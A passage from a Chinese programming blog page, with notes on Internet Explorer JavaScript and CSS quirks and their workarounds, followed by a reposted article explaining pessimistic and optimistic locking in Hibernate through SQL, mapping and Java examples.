out事件可以替代，因为页面元素获得焦点不会触发document的onblur事件[也可能是触发，但是最终也会触发 onfocusin,:onfocusout-&gt;onfocusin]</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span>------------------------------------------------------------ <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">在unbeforeload 和 ununload事件里发送ajax请求的话，ie会无法传送post值，解决办法是使用header来传参，但是header有大小限制，数据量太大的话就不会被服务器接收。也可使用ajax的同步请求来解决。使用new Image().src的方式也可以，但感觉不是很稳定。</span></p> <p>------------------------------------------------------------</p> <p>IE TEXTAREA javascript换行问题：</p> <p>IE TEXTAREA javascript换行 txt.value+='\r\n';光标会显示没有换行（其实已经换行了），FF,chrome是好的，ie(6,7,8)有此bug,解决方案:将event.keyCode = 13让文本换行。</p> <p>-------------------------------------------------------------------- </p> <p>ie 下的checkbox点击总觉得怪怪的，有时明明点了却没效果。</p> <p>如果要将某个元素disable掉,el.disabled = true;这样写到是没问题。</p> <p>但是要将原来disabled 的元素enable的话，<font color="#800000">el.disabled = false; </font>在IE下就有点怪了，有时可以有时又不行。</p> <p>解决方法是删除掉disabled 属性 <font color="#800000">el.removeAttribute('disabled');</font></p> <p>-----------------------------------------------------------------</p> <p>scrollLeft</p> <p>一般ie还是支持这个的，有的版本(ie7beta)</p> <p>在面顶部声明为： DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;&#160; &quot;http://www.w3.org/TR/2000/REC-xhtml1-20000126/DTD/xhtml1-transitional.dtd&quot;&gt; 就会有问题.</p> <p>但是往往在你加载页面时得到的scrollLeft为0,要等到页面全部初始化好后才能得到正确的值。</p> <p>--------------------------------------------------------------------</p> <p>ie6 option selected属性问题：</p> <p>ie6下设置option的selected属性会导致脚本错误:option.selected = true;//error</p> <p>解决办法：<tt>option.setAttribute('selected', true)</tt>; //work</p> <p>-----------------------------------------------------------------------------------</p></p> <p>其实IE对于非表单物件一样可以用getElementsByName,只不过要求那个element 的Name和Id 都存在并且相同. 否则就取不到。</p> <p>&lt;div id=&quot;spn&quot; name=&quot;spn&quot;&gt;...&lt;/div&gt; <br />&lt;div id=&quot;spn&quot; name=&quot;spn&quot;&gt;...&lt;/div&gt; </p> <p>------------------------------------------------------------------------------------</p> <p>title换行,这个只有IE可以,使用<font color="#0000ff">&amp;#13;<font color="#000000">来代表换行</font>。</font></p> <p><font color="#0000ff">但是用包含这个字符的html使用extjs模板会导致非IE浏览器下模板编译错误！ </font></p> <p><font color="#000000">---------------------------------------------------------------------------</font></p> <p><font color="#000000">对于下面的html:</font></p> <div><pre>&lt;div id=&quot;<span style="color: #8b0000">content</span>&quot;&gt;
  	&lt;div <span style="color: #0000ff">class</span>=&quot;<span style="color: #8b0000">line</span>&quot;&gt;
    &lt;div id=&quot;<span style="color: #8b0000">c1</span>&quot; <span style="color: #0000ff">class</span>=&quot;<span style="color: #8b0000">ct</span>&quot;&gt;&lt;div id=&quot;<span style="color: #8b0000">holder1</span>&quot; <span style="color: #0000ff">class</span>=&quot;<span style="color: #8b0000">holder</span>&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
    &lt;div id=&quot;<span style="color: #8b0000">c2</span>&quot; <span style="color: #0000ff">class</span>=&quot;<span style="color: #8b0000">ct</span>&quot;&gt;&lt;div id=&quot;<span style="color: #8b0000">holder2</span>&quot; <span style="color: #0000ff">class</span>=&quot;<span style="color: #8b0000">holder</span>&quot;&gt;2&lt;/div&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;/div&gt;</pre></div> <p>想让div#c1,div#c2横向排列,如果这样写:</p> <div><pre>.<span style="color: #800000">ct</span>{
	<span style="color: #800000">float</span>: <span style="color: #800000">left</span>;
}</pre></div> <p>ok,那是没问题的。</p> <p>但是如果这样写:</p> <div><pre>.<span style="color: #800000">line</span>&gt;<span style="color: #800000">div</span>{
	<span style="color: #800000">float</span>: <span style="color: #800000">left</span>;
}</pre></div> <p>你会发现c1,c2仍然换行了。这个问题只有ie才有。</p> <p> </p></p> <p> </p> <p><font color="#0000ff"><font color="#000000"><br /> <br /></font></font></p> <p class="read-more">Continue reading <a class="heading" href="/web%E5%89%8D%E7%AB%AF/2011/06/09/ie-e7-ba-a0-e7-bb-93-e6-b1-87-e6-80-bb.html" data-flip="title">ie 纠结汇总</a></p> </article> <article id="post-java/%E6%95%B0%E6%8D%AE%E5%BA%93/2011/06/09/%e3%80%90%e8%bd%ac%e3%80%91hibernate%e7%9a%84%e4%b9%90%e8%a7%82%e9%94%81%e4%b8%8e%e6%82%b2%e8%a7%82%e9%94%81" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/java/%E6%95%B0%E6%8D%AE%E5%BA%93/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91hibernate-e7-9a-84-e4-b9-90-e8-a7-82-e9-94-81-e4-b8-8e-e6-82-b2-e8-a7-82-e9-94-81.html" data-flip="title"> 【转】Hibernate的乐观锁与悲观锁 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T18:02:21+08:00">09 Jun 2011</time> in <span>Java</span> / <span>数据库</span> on <span>Hibernate</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <p><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000cc;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">锁（ locking ）</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">业务逻辑的实现过程中，往往需要保证数据访问的排他性。如在金融系统的日终结算处理中，我们希望针对某个 cut-off 时间点的数据进行处理，而不希望在结算进行过程中（可能是几秒种，也可能是几个小时），数据再发生变化。此时，我们就需要通过一些机制来保证这些数据在某 个操作过程中不会被外界修改，这样的机制，在这里，也就是所谓的 “锁” ，即给我们选定的目标数据上锁，使其无法被其他程序修改。Hibernate 支持两种锁机制：即通常所说的 “悲观锁（ Pessimistic Locking ）”和 “乐观锁（ Optimistic Locking ）” 。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">悲观锁（ Pessimistic Locking ）</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">悲观锁，正如其名，它指的是对数据被外界（包括本系统当前的其他事 务，以及来自外部系统的事务处理）修改持保守态度，因此，在整个数据处理过程中，将数据处于锁定状态。悲观锁的实现，往往依靠数据库提供的锁机制（也只有 数据库层提供的锁机制才能真正保证数据访问的排他性，否则，即使在本系统中实现了加锁机制，也无法保证外部系统不会修改数据）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">一个典型的倚赖数据库的悲观锁调用：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">select * from account where name=”Erica” for update</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">这条 sql 语句锁定了 account 表中所有符合检索条件（name=”Erica”）的记录。本次事务提交之前（事务提交时会释放事务过程中的锁），外界无法修改这些记录。Hibernate 的悲观锁，也是基于数据库的锁机制实现。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">下面的代码实现了对查询记录的加锁：</span> <br /><span style="background-color: #ffffff;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">String hqlStr =&quot;from TUser as user where user.name=‘Erica‘&quot;;</span> <br /><span style="background-color: #ffffff;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Query query = session.createQuery(hqlStr);</span> <br /><span style="background-color: #ffffff;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">query.setLockMode(&quot;user&quot;,LockMode.UPGRADE); // 加锁</span> <br /><span style="background-color: #ffffff;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">List userList = query.list();// 执行查询，获取数据</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">query.setLockMode 对查询语句中，特定别名所对应的记录进行加锁（我们为TUser 类指定了一个别名 “user” ），这里也就是对返回的所有 user 记录进行加锁。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">观察运行期 Hibernate 生成的 SQL 语句：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">select tuser0_.id as id, tuser0_.name as name, tuser0_.group_id</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">as group_id, tuser0_.user_type as user_type, tuser0_.sex as sex</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">from t_user tuser0_ where (tuser0_.name=‘Erica‘ ) for update</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">这里 Hibernate 通过使用数据库的 for update 子句实现了悲观锁机制。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Hibernate 的加锁模式有：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">LockMode.NONE ：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 无锁机制。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">LockMode.WRITE ：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> Hibernate 在 Insert 和 Update 记录的时候会自动获取。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">LockMode.READ ：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> Hibernate 在读取记录的时候会自动获取。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">以上这三种锁机制一般由 Hibernate 内部使用，如 Hibernate 为了保证 Update过程中对象不会被外界修改，会在 save 方法实现中自动为目标对象加上 WRITE 锁。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">LockMode.UPGRADE ：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">利用数据库的 for update 子句加锁。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">LockMode. UPGRADE_NOWAIT ：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> Oracle 的特定实现，利用 Oracle 的 for update nowait 子句实现加锁。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">上面这两种锁机制是我们在应用层较为常用的，加锁一般通过以下方法实现：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">Criteria.setLockMode</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">Query.setLockMode</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">Session.lock</span> </p> <p><em><font color="#0000ff">PS:session.load也可以,控制台实现就是用一个专门的表的一条记录来作为锁</font> <br /></em><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意，只有在查询开始之前（也就是 Hiberate 生成 SQL 之前）设定加锁，才会真正通过数据库的锁机制进行加锁处理，否则，数据已经通过不包含 for update 子句的 Select SQL 加载进来，所谓数据库加锁也就无从谈起。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">乐观锁（ Optimistic Locking ）</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">相对悲观锁而言，乐观锁机制采取了更加宽松的加锁机制。悲观锁大多数情况下依靠数据库的锁机制实现，以保证操作最大程度的独占性。但随之而来的就是数据库性能的大量开销，特别是对长事务而言，这样的开销往往无法承受。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">如 一个金融系统，当某个操作员读取用户的数据，并在读出的用户数据的基础上进行修改时如更改用户帐户余额），如果采用悲观锁机制，也就意味着整个操作过程中 （从操作员读出数、开始修改直至提交修改结果的全过程，甚至还包括操作员中途去煮咖啡的时间），数据库记录始终处于加锁状态，可以想见，如果面对几百上千 个并发，这样的情况将导致怎样的后果。乐观锁机制在一定程度上解决了这个问题。乐观锁，大多是基于数据版本（ Version ）记录机制实现。何谓数据版本？即为数据增加一个版本标识，在基于数据库表的版本解决方案中，一般是通过为数据库表增加一个 “version” 字段来实现。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">读取出数据时，将此版本号一同读出，之后更新时，对此版本号加一。此时，将提交数据的版本数据与数据库表对应记录的当前版本信息进行比对，如果提交的数据版本号大于数据库表当前版本号，则予以更新，否则认为是过期数据。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">对于上面修改用户帐户信息的例子而言，假设数据库中帐户信息表中有一个version 字段，当前值为 1 ；而当前帐户余额字段（balance）为 $100 。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">1 操作员 A 此时将其读出（version=1），并从其帐户余额中扣除 $50（$100-$50）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">2 在操作员 A 操作的过程中，操作员 B 也读入此用户信息（version=1），并从其帐户余额中扣除 $20 （$100-$20）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">3 操作员 A 完成了修改工作，将数据版本号加一（version=2），连同帐户扣除后余额（balance=$50），提交至数据库更新，此时由于提交数据版本大于数据库记录当前版本，数据被更新，数据库记录 version 更新为 2 。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">4 操作员 B 完成了操作，也将版本号加一（version=2）试图向数据库提交数据（balance=$80），但此时比对数据库记录版本时发现，操作员 B 提交的数据版本号为 2 ，数据库记录当前版本也为 2 ，不满足“ 提交版本必须大于记录当前版本才能执行更新“ 的乐观锁策略，因此，操作员 B 的提交被驳回。这样，就避免了操作员 B 用基于 version=1 的旧数据修改的结果覆盖操作员 A 的操作结果的可能。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">从上面的例子可 以看出，乐观锁机制避免了长事务中的数据库加锁开销（操作员 A 和操作员 B 操作过程中，都没有对数据库数据加锁），大大提升了大并发量下的系统整体性能表现。需要注意的是，乐观锁机制往往基于系统中的数据存储逻辑，因此也具备一 定的局限性，如在上例中，由于乐观锁机制是在我们的系统中实现，来自外部系统的用户余额更新操作不受我们系统的控制，因此可能会造成脏数据被更新到数据库 中。在系统设计阶段，我们应该充分考虑到这些情况出现的可能性，并进行相应调整（如将乐观锁策略在数据库存储过程中实现，对外只开放基于此存储过程的数据 更新途径，而不是将数据库表直接对外公开）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Hibernate 在其数据访问引擎中内置了乐观锁实现。如果不用考虑外部系统对数据库的更新操作，利用 Hibernate 提供的透明化乐观锁实现，将大大提升我们的生产力。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Hibernate 中可以通过 class 描述符的 optimistic-lock 属性结合 version描述符指定。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">现在，我们为之前示例中的 TUser 加上乐观锁机制。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">1 ． 首先为 TUser 的 class 描述符添加 optimistic-lock 属性：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;hibernate-mapping&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;class name=&quot;org.hibernate.sample.TUser&quot; table=&quot;t_user&quot; dynamic-update=&quot;true&quot;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">dynamic-insert=&quot;true&quot; optimistic-lock=&quot;version&quot;&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">……</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/class&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/hibernate-mapping&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">optimistic-lock 属性有如下可选取值： </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">none：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">无乐观锁 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">version：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">通过版本机制实现乐观锁</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">dirty：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">通过检查发生变动过的属性实现乐观锁</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none">all：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">通过检查所有属性实现乐观锁</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">其 中通过 version 实现的乐观锁机制是 Hibernate 官方推荐的乐观锁实现，同时也是 Hibernate 中，目前唯一在数据对象脱离 Session 发生修改的情况下依然有效的锁机制。因此，一般情况下，我们都选择 version 方式作为 Hibernate 乐观锁实现机制。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">2 ． 添加一个 Version 属性描述符</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;hibernate-mapping&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;class name=&quot;org.hibernate.sample.TUser&quot; table=&quot;t_user&quot; dynamic-update=&quot;true&quot; dynamic-insert=&quot;true&quot;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">optimistic-lock=&quot;version&quot;&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;id name=&quot;id&quot; column=&quot;id&quot; type=&quot;java.lang.Integer&quot;&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;generator class=&quot;native&quot;&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/generator&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/id&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;version column=&quot;version&quot; name=&quot;version&quot; type=&quot;java.lang.Integer&quot;/&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">……</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/class&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/hibernate-mapping&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意 version 节点必须出现在 ID 节点之后。这里我们声明了一个 version 属性，用于存放用户的版本信息，保存在 TUser 表的version 字段中。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">此时如果我们尝试编写一段代码，更新 TUser 表中记录数据，如：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Criteria criteria = session.createCriteria(TUser.class);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">criteria.add(Expression.eq(&quot;name&quot;,&quot;Erica&quot;));</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">List userList = criteria.list();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">TUser user =(TUser)userList.get(0);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Transaction tx = session.beginTransaction();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">user.setUserType(1); // 更新 UserType 字段</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">tx.commit();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">每次对 TUser 进行更新的时候，我们可以发现，数据库中的 version 都在递增。而如果我们尝试在 tx.commit 之前，启动另外一个 Session ，对名为 Erica 的用户进行操作，以模拟并发更新时的情形：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Session session= getSession();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Criteria criteria = session.createCriteria(TUser.class);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">criteria.add(Expression.eq(&quot;name&quot;,&quot;Erica&quot;));</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Session session2 = getSession();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Criteria criteria2 = session2.createCriteria(TUser.class);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">criteria2.add(Expression.eq(&quot;name&quot;,&quot;Erica&quot;));</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">List userList = criteria.list();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">List userList2 = criteria2.list();TUser user =(TUser)userList.get(0);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">TUser user2 =(TUser)userList2.get(0);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Transaction tx = session.beginTransaction();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Transaction tx2 = session2.beginTransaction();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">user2.setUserType(99);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">tx2.commit();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">user.setUserType(1);</span> <br /><span style="background-color: transparent;font-style: normal;font-family: verdana;color: #3333ff;font-size: 10pt;vertical-align: baseline;font-weight: normal;text-decoration: none">tx.commit();</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">执行以上代码，代码将在 tx.commit() 处抛出 StaleObjectStateException 异常，并指出版本检查失败，当前事务正在试图提交一个过期数据。通过捕捉这个异常，我们就可以在乐观锁校验失败时进行相应处理。</span> </p> <p> <span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span></p> <p class="read-more">Continue reading <a class="heading" 